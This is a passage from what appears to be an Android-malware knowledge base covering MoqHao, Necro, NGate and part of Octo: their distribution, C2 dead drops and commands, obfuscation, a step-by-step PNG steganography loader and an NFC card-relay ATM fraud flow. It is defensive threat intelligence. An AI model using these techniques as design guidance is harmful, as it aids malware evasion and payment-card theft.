Runs immediately after installation without user launch Fake Chrome overlay Persistent Chrome update prompt concealing malicious activity Call eavesdropping Monitors and records phone calls Location tracking Tracks device GPS coordinates"},{"location":"malware/families/moqhao/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/moqhao/#auto-execution-mechanism-2024","title":"Auto-Execution Mechanism (2024)","text":"<p>The 2024 variant documented by McAfee achieves auto-execution by abusing Android's content provider initialization. When an app declares a content provider in its manifest, the Android system initializes that provider during the app installation process to verify uniqueness of the provider authority. MoqHao places its malicious initialization code in this content provider's <code>onCreate()</code> method, which the system calls automatically without any user interaction.</p> <p>This eliminates the social engineering step of convincing users to open the app after installation. The malware begins operating in the background immediately, displaying a fake Chrome notification to prompt permission grants. McAfee reported the findings to Google, which began working on mitigations to prevent this type of auto-execution in future Android versions.</p> <p>The 2024 variant also uses Unicode characters in the app label to evade detection. Instead of displaying a readable app name, the label uses zero-width and special Unicode characters that render as blank or near-invisible text in the app drawer.</p>"},{"location":"malware/families/moqhao/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>MoqHao uses a layered C2 resolution strategy built on social media dead drops. Rather than hard-coding C2 server addresses into the APK, the malware stores social media profile URLs and retrieves the actual C2 address at runtime from encoded text in profile descriptions.</p>"},{"location":"malware/families/moqhao/#dead-drop-resolution-flow","title":"Dead Drop Resolution Flow","text":"<ol> <li>The APK contains hard-coded URLs pointing to profiles on social media platforms</li> <li>The malware fetches the profile page via HTTP GET</li> <li>It extracts an encoded string from the profile's \"About\" or description field</li> <li>The string is decrypted (DES in CBC mode with a hard-coded key) to reveal the C2 IP address</li> <li>The malware connects to the C2 via WebSocket using JSON-RPC</li> </ol>"},{"location":"malware/families/moqhao/#platform-evolution","title":"Platform Evolution","text":"Period Dead Drop Platform Early variants Twitter (accounts stored with <code>\\|</code> separator) 2019-2022 Imgur profiles (shaoye77, shaoye88, shaoye99 accounts), encoded in \"About\" section 2022-2023 Pinterest profiles, phishing content extracted from bio/description fields 2023+ Baidu, VKontakte, iCloud 2024-2025 VK (m.vk.com) for C2 resolution, iCloud for payload hosting <p>This approach lets operators rotate C2 servers by editing a social media profile, without needing to push malware updates. Takedown of any single platform profile only disrupts operations temporarily since new profiles can be created on alternative platforms.</p>"},{"location":"malware/families/moqhao/#staging-infrastructure","title":"Staging Infrastructure","text":"<p>Team Cymru identified 14 MoqHao C2 servers based on malware analysis and infrastructure pivots. The delivery chain uses disposable staging infrastructure relying on Dynamic DNS services (such as DuckDNS subdomains) for landing pages, while the actual C2 servers are hosted on dedicated infrastructure (EHOSTIDC and VELIANET autonomous systems observed by Sekoia).</p>"},{"location":"malware/families/moqhao/#c2-commands","title":"C2 Commands","text":"<p>The malware communicates with C2 via WebSocket using JSON-RPC. McAfee documented 20 commands in the 2024 variant:</p> Command Function <code>getSmsKW</code> Exfiltrate all SMS messages to C2 <code>sendSms</code> Send SMS to specified number (smishing propagation) <code>gcont</code> Export entire contacts list to C2 <code>getPhoneState</code> Collect device identifiers (IMEI, SIM number, Android ID, serial number) <code>callPhone</code> Initiate phone calls <code>http</code> Send HTTP requests (download payloads, exfiltrate data) <p>Additional commands handle photo exfiltration, call recording, location tracking, app installation, and configuration updates. The 2024 variant added new commands beyond the set present in earlier versions.</p>"},{"location":"malware/families/moqhao/#smishing-infrastructure","title":"Smishing Infrastructure","text":"<p>Each infected device functions as an SMS distribution node. The C2 server provides:</p> <ul> <li>SMS message templates localized by region</li> <li>Target phone number lists (harvested from previously infected devices)</li> <li>Timing parameters to avoid carrier-level SMS filtering</li> </ul> <p>The phishing message content is dynamically retrieved from social media profiles (Pinterest bios in the 2024 variant), allowing operators to update lure text without pushing malware updates. This creates a distributed smishing network similar to FluBot's approach, though MoqHao predates FluBot by several years and primarily targets Asian markets.</p>"},{"location":"malware/families/moqhao/#anti-analysis-and-obfuscation","title":"Anti-Analysis and Obfuscation","text":"Technique Details Tencent Packer Some variants use the Tencent packer to hide the malicious payload Native packing Custom native (C/C++) packer wrapping the DEX payload Multidex obfuscation Malicious loader hidden among junk code files using Android Multidex String encryption DES encryption with hard-coded keys for C2 configuration strings Icon hiding Uses <code>setComponentEnabledSetting</code> on PackageManager to hide the app icon after installation Geofencing Landing pages check visitor geolocation and OS to filter researchers Allowlisting Korean landing pages require phone number entry checked against an allowlist before serving the APK Unicode label 2024 variants use zero-width Unicode characters in app labels Tencent Push Service Used in some variants to issue commands to infected devices, blending with legitimate push notification traffic"},{"location":"malware/families/moqhao/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Overlay triggering, permission auto-granting, UI interaction READ_SMS Read SMS messages for OTP interception RECEIVE_SMS Intercept incoming SMS in real-time SEND_SMS Send smishing messages for propagation READ_CONTACTS Harvest contact lists for smishing targets INTERNET C2 communication ACCESS_FINE_LOCATION GPS tracking of infected device CAMERA Photo capture RECORD_AUDIO Call eavesdropping RECEIVE_BOOT_COMPLETED Persistence across reboots CALL_PHONE Initiate calls READ_PHONE_STATE Collect device identifiers"},{"location":"malware/families/moqhao/#target-regions","title":"Target Regions","text":"<p>MoqHao's geographic targeting has expanded significantly since its initial focus on East Asia.</p> Region Target Apps/Services Period Japan Yamato Transport, Japan Post, banking apps 2017-present South Korea Korea Post, banking apps, cryptocurrency exchanges 2017-present Taiwan Postal services, financial institutions 2018-present France La Poste, banking apps 2022-present Germany DHL, banking apps 2022-present United States Postal services 2022-present India Banking apps 2024-present Austria, Turkey, Malaysia Various financial services Intermittent campaigns <p>Kaspersky's detection data from September through December 2022 showed the highest Wroba.o detection rates in France (54.4%), Japan (12.1%), and the United States (10.1%).</p>"},{"location":"malware/families/moqhao/#scale","title":"Scale","text":"<p>Team Cymru observed close to 1.5 million victim communications to MoqHao C2 servers since the end of 2022, with evidence of campaigns targeting every continent. Africa, Asia, and Europe were the most impacted regions.</p> <p>Sekoia documented approximately 70,000 Android device compromises in a single French campaign, with over 90,000 unique IP addresses requesting the C2 server distributing MoqHao. Japan alone accounted for nearly 25,000 malicious APK downloads in one campaign wave, with Austria and France each contributing roughly 7,000.</p>"},{"location":"malware/families/moqhao/#notable-campaigns","title":"Notable Campaigns","text":"<p>2017-2018: Kaspersky discovers Roaming Mantis compromising home routers in Japan, South Korea, and Bangladesh via DNS hijacking to distribute fake Chrome update APKs. The campaign supports 27 languages by May 2018 and adds iOS phishing and desktop crypto mining.</p> <p>2018: McAfee documents MoqHao spreading via SMS phishing in South Korea, impersonating Chrome browser updates. Trend Micro links XLoader and FakeSpy to the Yanbian Gang.</p> <p>2019: McAfee finds MoqHao-related spyware on Google Play targeting Japan and Korea, marking the family's first appearance on the official app store.</p> <p>2020: Operators adapt smishing lures to COVID-19, sending messages about free mask delivery in Japan. Korean landing pages add phone number allowlisting to filter security researchers.</p> <p>2021: McAfee documents OS-specific payloads in Roaming Mantis smishing campaigns. Android devices receive MoqHao APK; iOS users get Apple ID phishing.</p> <p>2022, January-June: Kaspersky tracks Roaming Mantis expansion to Europe, documenting campaigns against French and German users using postal service lures. Sekoia reports 70,000 compromised Android devices in France with over 90,000 unique IPs contacting C2 infrastructure.</p> <p>2022, September: Kaspersky discovers the DNS changer function built into Wroba.o. The malware targets 113 specific WiFi router models (primarily South Korean manufacturers) and changes their DNS settings when an infected phone connects to their network.</p> <p>2024, February: McAfee reports the auto-execution evolution. New MoqHao variants start automatically after installation by abusing Android content provider initialization. Targets include users in France, Germany, India, Japan, and South Korea.</p> <p>2024-2025: Hunt.io documents campaigns abusing Apple iCloud for APK hosting and VK for C2 resolution. Smishing messages in Japanese claim failed delivery attempts, with shortened URLs hosted on X/Twitter redirecting to geofenced landing pages.</p>"},{"location":"malware/families/moqhao/#related-families","title":"Related Families","text":"<p>The Roaming Mantis ecosystem includes related malware beyond MoqHao:</p> <ul> <li>FakeCop / SpyAgent: A separate spyware family documented by Kaspersky in Part V and tracked by McAfee as SpyAgent, distributed through the same Roaming Mantis infrastructure</li> <li>FakeSpy: Linked by Trend Micro to the Yanbian Gang alongside XLoader/MoqHao</li> <li>FluBot: Shares the smishing distribution model but is an unrelated family operated by different actors. FluBot achieved similar worm-like propagation in Europe before its takedown in 2022</li> </ul>"},{"location":"malware/families/moqhao/#references","title":"References","text":""},{"location":"malware/families/necro/","title":"Necro","text":"<p>Necro is a multi-stage trojan downloader that has twice infiltrated Google Play through compromised advertising SDKs embedded in legitimate applications. Kaspersky first identified the family in 2019 inside CamScanner, a document scanning app with over 100 million installs, where a third-party advertising SDK called \"AdHub\" contained the Necro dropper. After a five-year gap, Kaspersky documented a far more advanced resurgence in September 2024, finding a new variant inside Wuta Camera (10M+ installs) and Max Browser (1M+ installs) through a malicious SDK called \"Coral SDK.\" The 2024 variant is notable for using image steganography to hide payloads inside PNG files, a technique rarely seen in Android malware. Total affected installs exceeded 11 million through official Google Play distribution alone, with additional infections through modded APKs of Spotify, WhatsApp, and Minecraft distributed on unofficial channels.</p>"},{"location":"malware/families/necro/#overview","title":"Overview","text":"Attribute Details First Seen August 2019 (CamScanner incident) Last Seen Active Status Active, Coral SDK variant in the wild Type Trojan downloader, adware, proxy, subscription fraud Attribution Unknown Aliases Necro Trojan, NecroBot"},{"location":"malware/families/necro/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Downloader.AndroidOS.Necro / Trojan-Dropper.AndroidOS.Necro.n (2019) ESET Android/TrojanDownloader.Necro McAfee Android/Necro Bitdefender Android.Trojan.Downloader.Necro"},{"location":"malware/families/necro/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Necro has no direct code lineage to other documented banking trojan families. It operates as a modular downloader platform rather than a credential-stealing trojan.</p> <p>The 2019 variant (Trojan-Dropper.AndroidOS.Necro.n) was a straightforward dropper that decrypted and executed malicious code from a file called <code>mutter.zip</code> stored in the app's resources. Kaspersky noted that the same module had been observed preinstalled on some Chinese smartphones, suggesting the operators had multiple distribution strategies from the start.</p> <p>The 2024 variant represents a complete architectural rewrite. The dropper evolved into a multi-stage loader with steganography-based payload delivery, a modular plugin system, and distribution through a purpose-built malicious SDK (Coral SDK) designed to look like a legitimate advertising component. The only thread connecting the two generations is the Necro detection name and the shared supply chain vector of hiding inside third-party SDKs bundled with legitimate apps.</p> <p>The supply chain approach mirrors Triada's strategy of embedding in legitimate software to reach massive install bases, though Necro operates at the SDK level rather than the firmware level. The 2024 campaign's use of SDK supply chain compromise is directly comparable to Goldoson, where a malicious SDK was embedded in 60+ apps with 100M+ downloads.</p>"},{"location":"malware/families/necro/#distribution","title":"Distribution","text":"<p>Necro reaches users through two vectors: compromised legitimate apps on Google Play and modified APKs distributed through unofficial channels.</p>"},{"location":"malware/families/necro/#google-play-sdk-compromise","title":"Google Play (SDK Compromise)","text":"<p>2019: CamScanner</p> <p>CamScanner, a document scanning app with 100M+ installs on Google Play, contained the Necro.n dropper inside a third-party advertising SDK provided by \"AdHub.\" The malicious component was introduced without the app developer's knowledge. After Kaspersky's report, Google removed CamScanner from the Play Store. The app was later republished with the malicious SDK removed.</p> <p>2024: Coral SDK</p> App Developer Downloads Infected Versions Clean Version Wuta Camera Benqu 10M+ 6.3.2.148 through 6.3.6.148 6.3.7.138+ Max Browser WA message recover-wamr 1M+ Up to 1.2.0 (all versions) None (removed from Play Store) <p>The Coral SDK presented itself as a legitimate advertising integration module. App developers included it as part of a broader advertising SDK called \"adsrun\" initialized in the application's <code>onCreate</code> method. The malicious behavior was buried inside the Coral SDK subcomponent, hidden behind obfuscated native code and an apparently legitimate API surface. The developers of these apps were likely unaware of the SDK's true purpose.</p> <p>After Kaspersky's report, Google removed the malicious code from Wuta Camera (clean version 6.3.7.138 shipped September 2024), and Max Browser was taken down entirely since no clean version existed.</p>"},{"location":"malware/families/necro/#unofficial-channels-mod-apks","title":"Unofficial Channels (Mod APKs)","text":"<p>Modified versions of popular apps distributed through third-party sites, forums, and Telegram channels also carry Necro. Kaspersky documented the following infected mods:</p> Modded App Example Loader Mechanism Spotify \"Spotify Plus\" v18.9.40.5 Custom advertising SDK with embedded loader WhatsApp Modified WhatsApp builds Necro loader injected into repackaged APK Minecraft Modded game APKs Loader integrated into mod framework Stumble Guys Game mods Loader in repackaged APK Car Parking Multiplayer Game mods Loader in repackaged APK Melon Sandbox Game mods Loader in repackaged APK <p>The Spotify mod is particularly well-documented. The \"Spotify Plus\" v18.9.40.5 mod implements a custom <code>Application</code> subclass that initializes the adsrun SDK in its <code>onCreate</code> method. This SDK loads the Coral SDK component, which contacts the C2 server to fetch the steganographic payload. The mod promises premium features for free, attracting users searching for cracked apps on third-party download sites.</p>"},{"location":"malware/families/necro/#capabilities","title":"Capabilities","text":"Capability Description Steganographic payload delivery Hides second-stage payloads in PNG image files using pixel value encoding Invisible ad display Loads and renders ads in invisible WebView windows, generating fraudulent impressions Arbitrary DEX/JAR execution Downloads and executes additional modules from C2 Proxy tunneling Routes third-party traffic through infected devices via SOCKS/HTTP proxy Subscription fraud Automates WAP billing enrollment via invisible browser sessions JavaScript execution Executes arbitrary JavaScript in hidden WebView contexts App installation Downloads and silently installs additional APKs"},{"location":"malware/families/necro/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/necro/#infection-chain","title":"Infection Chain","text":"<p>The 2024 Necro variant follows a multi-stage loading process:</p> <pre><code>Host App (Google Play or mod APK)\n    -&gt; Application.onCreate() initializes \"adsrun\" advertising SDK\n    -&gt; adsrun SDK initializes Coral SDK subcomponent\n    -&gt; Coral SDK loads native library (libcoral.so or libsvm.so)\n    -&gt; Native library sends encrypted POST to C2 with device info\n    -&gt; C2 responds with JSON containing PNG image URL + metadata (MD5, version)\n    -&gt; Coral SDK downloads PNG image\n    -&gt; Steganography algorithm extracts Base64-encoded JAR from pixel values\n    -&gt; JAR loaded via DexClassLoader (shellPlugin - second stage)\n    -&gt; shellPlugin fetches and loads functional plugins from C2\n    -&gt; Plugins execute based on C2 configuration\n</code></pre>"},{"location":"malware/families/necro/#steganography-loader","title":"Steganography Loader","text":"<p>The most distinctive technical feature of the 2024 variant is payload concealment within PNG images. The Coral SDK uses a custom steganographic algorithm that operates on pixel color channels:</p> <ol> <li>Downloads a PNG image from C2 infrastructure</li> <li>Extracts pixel values from the ARGB channels using standard Android bitmap methods (<code>getPixel</code>)</li> <li>Reads the blue channel of each pixel as data bytes</li> <li>Interprets the first four bytes as a little-endian integer specifying the payload size</li> <li>Reads the subsequent bytes up to the specified size</li> <li>Decodes the resulting byte array as Base64, producing a JAR file</li> <li>Loads the JAR via <code>DexClassLoader</code>, instantiating the class <code>sdk.fkgh.mvp.SdkEntry</code></li> <li>Calls the <code>run</code> method on the loaded class to begin execution</li> </ol> <p>This technique evades network-level inspection since the download appears to be a standard image request. Traditional network monitoring tools see an HTTP request for a PNG, not a malware download. The MD5 hash provided in the C2 response serves as an integrity check before extraction proceeds.</p>"},{"location":"malware/families/necro/#coral-sdk-obfuscation","title":"Coral SDK Obfuscation","text":"<p>The Coral SDK uses multiple layers of obfuscation to hide its true purpose:</p> Technique Implementation Native library obfuscation <code>libcoral.so</code> (78% of samples) and <code>libsvm.so</code> (22%) obfuscated with OLLVM String encryption All sensitive strings decrypted at runtime Dynamic class loading Actual functionality hidden behind <code>DexClassLoader</code> invocations Legitimate API surface SDK exposes standard-looking advertising APIs to app developers Probabilistic activation Loader generates a random number (0-99) and only activates if it exceeds a threshold (9 or 15 depending on package name), reducing analysis exposure <p>Zimperium's analysis found 12 unique hashes for <code>libcoral.so</code> across samples, indicating active development and versioning of the native loader component.</p>"},{"location":"malware/families/necro/#modular-plugin-architecture","title":"Modular Plugin Architecture","text":"<p>After the shellPlugin second stage loads, Necro operates as a plugin platform. The C2 server delivers functional modules based on the infected device's profile and the operator's current campaign objectives:</p> Plugin Internal Name Function NProxy <code>NProxy</code> Creates a tunnel through the victim's device. Connects to a hardcoded server that issues commands to forward traffic between endpoints, turning the device into a proxy node. Island <code>island</code> Manages ad display timing. Generates a pseudo-random interval (in milliseconds) between displays of intrusive ads in invisible WebViews. Web <code>web</code> The most widely deployed plugin per Kaspersky telemetry. Contacts C2 periodically to receive page URLs, opens them in background WebViews, and processes interactive elements on those pages. Executes arbitrary JavaScript. Cube SDK <code>Cube SDK</code> Helper module that loads other ad-handling plugins in the background. Acts as a plugin orchestrator rather than performing direct malicious actions. Happy SDK <code>Happy SDK</code> Combines NProxy and Web module functionality into a single plugin. Appears in a non-modular Necro variant where plugins are not loaded individually. Also encountered under the name \"Jar SDK\" (newer version). Tap <code>Tap</code> Downloads arbitrary JavaScript and a WebView interface from C2 for interacting with subscription and ad pages. Still under active development with unused code paths for WAP billing automation. <p>The modular architecture gives the operators flexibility to deliver targeted payloads based on device characteristics, geographic region, or current monetization strategy. A device might receive only the ad fraud modules, or it might be enrolled as a proxy node, or both.</p>"},{"location":"malware/families/necro/#c2-communication","title":"C2 Communication","text":"<p>The Coral SDK communicates with C2 infrastructure using the following protocol:</p> <p>Initial Registration: The SDK sends an encrypted POST request containing device information (IMEI, OS version, app package name, debugging status) and host app metadata. The encryption uses a substitution cipher where substitution values are generated by a Java pseudo-random number generator seeded with a predefined constant.</p> <p>C2 Response: The server returns a JSON response encrypted with the same method. A <code>0</code> error code indicates success. On success, the response includes an array containing:</p> <ul> <li>URL to download the PNG image (steganographic payload)</li> <li>Expected MD5 hash for integrity verification</li> <li>SDK version number (<code>sdkver</code> field, observed at value <code>101</code> indicating active development)</li> <li>Plugin configuration and management settings</li> </ul> <p>Plugin C2: Individual plugins maintain their own C2 channels. The NProxy plugin connects to a separate server defined in its code for proxy command routing. The Web plugin periodically polls its C2 for new page lists and JavaScript payloads.</p> <p>Known C2 domains include <code>bearsplay[.]com</code> for the initial loader stage.</p>"},{"location":"malware/families/necro/#2019-variant-necron","title":"2019 Variant (Necro.n)","text":"<p>The original 2019 dropper was simpler in design:</p> <ol> <li>App launches and the malicious advertising SDK activates</li> <li>Dropper decrypts and executes code from <code>mutter.zip</code> in the app's resources</li> <li>Extracted code functions as a Trojan Downloader, fetching additional payloads from remote servers</li> <li>Downloaded payloads perform ad display and subscription fraud</li> </ol> <p>No steganography, no modular plugin system, no native library obfuscation. The jump from Necro.n to the 2024 Coral SDK variant represents a significant investment in evasion engineering.</p>"},{"location":"malware/families/necro/#target-regions","title":"Target Regions","text":"<p>Necro is not region-specific. The supply chain distribution via Google Play apps means infections follow each app's global user base. Kaspersky's telemetry between August 26 and September 15, 2024, recorded the highest attack concentrations in:</p> Region Countries Eastern Europe Russia (highest volume) South America Brazil, Ecuador Southeast Asia Vietnam Central America Mexico <p>The geographic spread reflects both the Play Store apps' user bases and the popularity of modded APKs in regions where paid app subscriptions are less common.</p>"},{"location":"malware/families/necro/#notable-campaigns","title":"Notable Campaigns","text":"<p>2019, August: Kaspersky discovers Necro.n inside CamScanner, a document scanning app with 100M+ Google Play installs. The dropper was introduced through a third-party advertising SDK (AdHub). Kaspersky reports the finding to Google, and CamScanner is temporarily removed from the Play Store. The app returns after removing the malicious SDK. Kaspersky also notes the same Necro.n module appearing preinstalled on some Chinese smartphones.</p> <p>2024, Late August: Kaspersky identifies the new Coral SDK-based Necro variant inside Wuta Camera (10M+ installs) and Max Browser (1M+ installs) on Google Play. The new variant uses image steganography for payload delivery and a full modular plugin system. Kaspersky also documents Necro in modded APKs of Spotify (\"Spotify Plus\" v18.9.40.5), WhatsApp, Minecraft, Stumble Guys, Car Parking Multiplayer, and Melon Sandbox distributed through unofficial channels.</p> <p>2024, September: Kaspersky publishes the full technical analysis and reports to Google. Wuta Camera is updated to version 6.3.7.138 with the Coral SDK removed. Max Browser is pulled from the Play Store entirely (its latest version 1.2.0 still contained Necro). Between August 26 and September 15, Kaspersky blocks over 10,000 Necro attacks worldwide.</p> <p>2024, September: Zimperium publishes supplementary analysis documenting the <code>libcoral.so</code> and <code>libsvm.so</code> native library variants, identifying 12 unique hashes for the primary loader library and noting the C2 SDK version field at <code>101</code>, indicating ongoing development.</p>"},{"location":"malware/families/necro/#related-families","title":"Related Families","text":"<p>Triada pioneered the supply chain approach at the firmware level, pre-installing malware on budget Android devices through compromised OEM vendors. Necro applies the same principle at the SDK level, compromising legitimate apps through malicious advertising components. Kaspersky noted that Necro.n (2019 variant) C2 domains overlapped with infrastructure used by the xHelper trojan, suggesting potential operational connections or shared infrastructure.</p> <p>Goldoson used an identical SDK-based supply chain vector, affecting 60+ apps with 100M+ downloads in South Korea. Harly and Joker operate in the same subscription fraud space as Necro's Tap plugin, though they distribute directly through Play Store apps rather than through SDK supply chain compromise. Mandrake shares the use of OLLVM-obfuscated native libraries and multi-stage loading, though Mandrake targets espionage rather than ad fraud.</p>"},{"location":"malware/families/necro/#references","title":"References","text":""},{"location":"malware/families/ngate/","title":"NGate","text":"<p>NGate is the first Android malware to use NFC relay attacks to clone victims' physical payment cards and withdraw cash from ATMs. ESET discovered the family in August 2024, tracing active campaigns back to November 2023 targeting clients of Czech banks. The malware repurposes NFCGate, an open-source NFC research tool developed at the Technical University of Darmstadt, to capture NFC data from a victim's payment card and relay it in real time to an attacker's rooted Android device. That device then emulates the cloned card to perform contactless ATM withdrawals. Although the primary suspect was arrested in March 2024 and the original campaign ceased, NGate's technique proved highly influential. ESET's H2 2025 threat report documented an 87% increase in NFC-targeting Android threats, with successors like GhostTap and SuperCard building directly on the approach NGate pioneered.</p>"},{"location":"malware/families/ngate/#overview","title":"Overview","text":"Attribute Details First Seen November 2023 (campaign start); March 2024 (malware samples identified) Last Seen March 2024 (suspect arrested, campaign ceased) Status Inactive (original campaign); technique spawned active successors Type NFC relay malware, banking fraud Attribution Unknown, one suspect arrested in Czech Republic Distribution Malicious PWAs (Progressive Web Apps) and WebAPKs"},{"location":"malware/families/ngate/#origin-and-lineage","title":"Origin and Lineage","text":"<p>NGate has no lineage to existing Android banking trojan families. Its technical foundation comes from NFCGate, an academic tool created by researchers at TU Darmstadt for NFC security testing and analysis. NFCGate is designed to capture, analyze, and relay NFC traffic between devices for legitimate research purposes. NGate's developers repurposed the relay functionality for criminal use, packaging it into a malicious app distributed to victims under the guise of banking applications.</p> <p>ESET's analysis confirmed that no prior mobile malware had implemented NFC relay for financial fraud. NGate represented an entirely new attack category on the mobile platform.</p> <p>The technique has since been adopted and extended by multiple successors. GhostTap applies the NFC relay concept at broader scale, SuperCard focuses on contactless payment fraud, and RatOn (documented by ThreatFabric) combines NFC relay with Automated Transfer Systems (ATS) for a hybrid approach.</p>"},{"location":"malware/families/ngate/#distribution","title":"Distribution","text":"<p>NGate campaigns used Progressive Web Apps (PWAs) and WebAPKs as the initial delivery mechanism, a technique that was novel at the time and has since become more common in mobile phishing.</p> Vector Details Malicious PWAs Progressive Web Apps impersonating Czech banking portals, installed via browser prompts WebAPKs Chrome-generated APKs from PWA manifests, appearing more legitimate than sideloaded apps Smishing SMS messages directing victims to phishing pages that prompt PWA installation Social engineering Victims instructed to tap their physical payment card against their phone after installation"},{"location":"malware/families/ngate/#attack-flow","title":"Attack Flow","text":"<ol> <li>Victim receives a smishing message impersonating their Czech bank</li> <li>The link leads to a phishing page that prompts installation of a PWA or WebAPK</li> <li>The installed app mimics the bank's interface and requests banking credentials</li> <li>The app instructs the victim to enable NFC and tap their physical payment card against their phone \"for verification\"</li> <li>NGate captures the NFC data from the payment card via the device's NFC reader</li> <li>The captured NFC data is relayed in real time to the attacker's rooted Android device</li> <li>The attacker's device emulates the cloned card using the relayed NFC data</li> <li>The attacker performs a contactless withdrawal at an ATM using the emulated card</li> </ol> <p>The social engineering component is critical: the victim must physically hold their payment card against their phone's NFC reader. The fake banking app provides a convincing UI that makes this action appear to be a standard verification step.</p>"},{"location":"malware/families/ngate/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/ngate/#core-features","title":"Core Features","text":"Capability Implementation NFC relay Captures NFC data from victim's physical card and relays it to attacker's device in real time Card emulation Attacker's rooted device emulates the cloned card for contactless transactions Credential phishing Fake banking interface collects login credentials, client IDs, dates of birth PIN capture Social engineering prompts victim to enter their card PIN within the fake app ATM cash withdrawal Attacker uses emulated card data at contactless-enabled ATMs"},{"location":"malware/families/ngate/#nfcgate-integration","title":"NFCGate Integration","text":"<p>NGate integrates the relay component of NFCGate directly into its APK. The original NFCGate tool requires two devices: a \"reader\" that captures NFC data and a \"server\" that receives the relayed data. In NGate's implementation:</p> <ul> <li>The victim's infected device acts as the reader</li> <li>The attacker's rooted Android device acts as the server, receiving NFC data over the internet</li> <li>The attacker's device uses host-based card emulation (HCE) to present the cloned card data to an ATM's NFC reader</li> </ul>"},{"location":"malware/families/ngate/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/ngate/#nfc-relay-mechanism","title":"NFC Relay Mechanism","text":"<p>The NFC relay is the core technical innovation. When the victim taps their payment card against their phone:</p> Step Technical Detail Capture Device NFC reader captures the card's NFC communication (ISO 14443) Relay NFCGate component forwards raw NFC data to attacker's server over HTTPS Emulation Attacker's rooted device receives data and emulates the card via HCE Transaction Emulated card presented to ATM NFC reader for contactless withdrawal <p>The relay happens in real time, meaning the card data does not need to be stored. The attacker must perform the ATM withdrawal while the victim's card is actively being read. This creates a time-sensitive operation but avoids leaving persistent card data on either device.</p>"},{"location":"malware/families/ngate/#pwa-and-webapk-delivery","title":"PWA and WebAPK Delivery","text":"<p>The use of PWAs and WebAPKs for distribution was tactically significant:</p> Delivery Type Advantage PWA Bypasses Play Store entirely, no APK sideloading warnings, installs via browser WebAPK Chrome generates a real APK from the PWA manifest, appears in app drawer like a native app Combined Victims see what looks like a legitimate banking app without triggering Android's sideloading protections"},{"location":"malware/families/ngate/#limitations","title":"Limitations","text":"<p>NGate had practical constraints that limited its scale:</p> Constraint Detail Physical card required Victim must physically tap their payment card against the phone Real-time operation Attacker must be at an ATM during the relay session Rooted device required Attacker's emulation device needs root access for HCE Contactless ATM required Target ATM must support NFC-based withdrawals PIN dependency Attacker needs the victim's PIN (captured via phishing) for ATM transactions"},{"location":"malware/families/ngate/#permissions","title":"Permissions","text":"Permission Purpose NFC Access device NFC hardware to capture payment card data INTERNET Relay captured NFC data to attacker's device over the network"},{"location":"malware/families/ngate/#target-regions","title":"Target Regions","text":"Region Details Czech Republic Sole target of the original NGate campaigns <p>NGate's geographic scope was limited to Czech bank clients. The phishing pages and PWAs impersonated specific Czech banking institutions. ESET confirmed that all identified victims were customers of Czech banks.</p> <p>Despite the narrow geographic focus, the technique is universally applicable. Any country with contactless-enabled ATMs and NFC-equipped payment cards is vulnerable to the same approach, which explains why successors have expanded the targeting.</p>"},{"location":"malware/families/ngate/#notable-campaigns","title":"Notable Campaigns","text":"<p>November 2023: The NGate campaign begins targeting Czech bank clients through smishing messages and malicious PWAs. Victims are tricked into installing fake banking apps and tapping their payment cards against their phones.</p> <p>March 2024: Czech police arrest a suspect connected to the NGate operation. The arrest ends the active campaign. At the time of arrest, the suspect had been withdrawing cash from ATMs in Prague using NFC data relayed from victims' devices.</p> <p>August 2024: ESET publishes the full technical analysis of NGate, revealing the NFC relay technique to the security community. The research identifies NGate as the first mobile malware to weaponize NFC relay for financial fraud and details the use of NFCGate as the underlying framework.</p> <p>2025: ESET's H2 2025 threat report documents an 87% year-over-year increase in NFC-targeting Android threats. The report attributes this growth directly to the blueprint NGate established, with multiple new families adopting and extending the NFC relay approach.</p>"},{"location":"malware/families/ngate/#related-families","title":"Related Families","text":"<p>NGate pioneered the NFC relay attack category on mobile, and several successors have built on the technique. GhostTap expanded the concept for broader geographic targeting and higher-volume operations. SuperCard focuses specifically on contactless payment fraud using relayed card data. RatOn, documented by ThreatFabric, represents the most advanced evolution by combining NFC relay with Automated Transfer Systems (ATS), enabling both NFC-based card cloning and on-device fraud within a single malware package.</p> <p>The PWA-based distribution method NGate used has also been adopted by other campaigns. MoqHao and other smishing-focused families have experimented with PWA delivery as an alternative to traditional APK sideloading.</p> <p>NGate's approach differs fundamentally from overlay-based banking trojans like Octo or Hook, which perform on-device fraud by remotely controlling the victim's banking app. NGate bypasses digital banking entirely by targeting the physical payment card, moving the fraud to the ATM rather than the mobile banking interface.</p>"},{"location":"malware/families/ngate/#references","title":"References","text":"<ul> <li>ESET - NGate Android malware relays NFC traffic to steal cash (August 2024)</li> <li>ESET - Threat Report H2 2025</li> </ul>"},{"location":"malware/families/octo/","title":"Octo","text":"<p>Octo is an Android banking trojan descended from the Exobot lineage (2016), offering remote access via real-time screen streaming using Android's MediaProjection API. Sold as malware-as-a-service (MaaS) on underground forums, it provides operators with on-device fraud (ODF) capability through a combination of screen streaming at 1 frame per second, accessibility-driven input simulation, and overlay injection. Its 2024 successor, Octo2, introduced DGA-based C2 resolution and improved anti-analysis, responding to a source code leak that spawned competing forks.</p>"},{"location":"malware/families/octo/#overview","title":"Overview","text":"Attribute Details First Seen 2022 (as Octo); 2021 (as Coper); 2018 (as ExobotCompact); 2016 (as Exobot) Status Active (Octo2, 2024-present) Type Banking trojan, MaaS, RAT Aliases ExobotCompact, Coper Attribution Threat actor \"Architect\" / \"goodluck\" (forum handles) Distribution Google Play droppers, sideloading, third-party stores"},{"location":"malware/families/octo/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Octo has the most thoroughly documented lineage of any modern Android banking trojan. ThreatFabric traced the full evolution from Exobot through ExobotCompact to Octo:</p> <p>Exobot (2016-2018): A full-featured banking trojan targeting financial institutions globally. The original author ceased development around 2018.</p> <p>ExobotCompact (2018-2021): A lightweight version created by a threat actor using the handle \"android\" on dark web forums. Stripped down from the original Exobot, it retained core banking trojan features but with a smaller footprint.</p> <p>Coper (2021): Some AV vendors independently discovered ExobotCompact samples in 2021 and tracked them under the name \"Coper.\" ThreatFabric proved that Coper and ExobotCompact were the same family.</p> <p>Octo (2022): In January 2022, ThreatFabric analysts spotted forum posts seeking the \"Octo Android 